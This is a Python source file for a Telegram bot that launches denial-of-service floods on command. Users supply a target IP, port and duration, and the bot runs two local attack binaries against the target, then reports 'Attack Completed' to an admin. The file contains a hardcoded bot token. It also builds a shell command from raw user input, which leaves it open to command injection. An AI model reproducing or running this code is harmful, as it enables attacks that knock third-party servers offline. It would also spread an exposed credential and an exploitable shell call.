import asyncio
from threading import Thread
import telebot
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random

loop = asyncio.new_event_loop()

# Bot Configuration
TOKEN = '8086042271:AAH89ims2kDFFTHoZMHhNx7b8-0rkeDPZfY'
ADMIN_USER_ID = 1210786221
USERNAME = "@GTX_GHOST"  # Username for management
attack_in_progress = False

# Logging setup
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Custom Markdown Escape Function
def escape_markdown(text, version=2):
    """Escapes Telegram Markdown special characters."""
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    if version == 1:
        escape_chars += r"!"
    return ''.join(f"\\{char}" if char in escape_chars else char for char in text)

# Async functions
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True
    logging.info(f"🔥 Attack started: {target_ip}:{target_port} for {duration} seconds")

    process_2111 = await asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration}")
    process_ranbal = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
    await asyncio.gather(process_2111.communicate(), process_ranbal.communicate())

    attack_in_progress = False
    notify_attack_finished(target_ip, target_port, duration)

def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *Attack Completed* 🔥\n"
        f"🎯 Target: `{escape_markdown(target_ip)}`\n"
        f"💣 Port: `{target_port}`\n"
        f"⏳ Duration: `{duration} seconds`\n\n"
        f"💥 Operated by {USERNAME}",
        parse_mode='MarkdownV2'
    )

def start_asyncio_loop():
    """Start the asyncio loop."""
    asyncio.set_event_loop(loop)
    loop.run_forever()

# Start asyncio loop in a background thread
thread = Thread(target=start_asyncio_loop, daemon=True)
thread.start()

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *Attack already in progress! Wait for it to complete.*", parse_mode="Markdown")
        return

    bot.send_message(chat_id, "📍 Enter target IP, Port, and Duration (in seconds) separated by spaces:")
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        global attack_in_progress
        if attack_in_progress:
            return

        args = message.text.split()
        if len(args) != 3:
            bot.send_message(
                message.chat.id,
                f"⚠️ *Invalid format!* Use: `IP PORT DURATION`.",
                parse_mode="Markdown"
            )
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(target_ip, target_port, duration), loop
        )

        bot.send_message(
            message.chat.id,
            f"💀 *Attack Initiated!*\n"
            f"🎯 Target: `{escape_markdown(target_ip)}`\n"
            f"🔒 Port: `{target_port}`\n"
            f"⏳ Duration: `{duration} seconds`\n\n"
            f"⚡ Powered by {USERNAME}",
            parse_mode="MarkdownV2"
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")
        bot.send_message(
            message.chat.id,
            f"❌ *Error:* {escape_markdown(str(e))}",
            parse_mode="MarkdownV2"
        )

if __name__ == "__main__":
    try:
        logging.info("🚀 Bot started successfully.")
        bot.polling(non_stop=True)
    except Exception as e:
        logging.error(f"Error in bot polling: {e}")
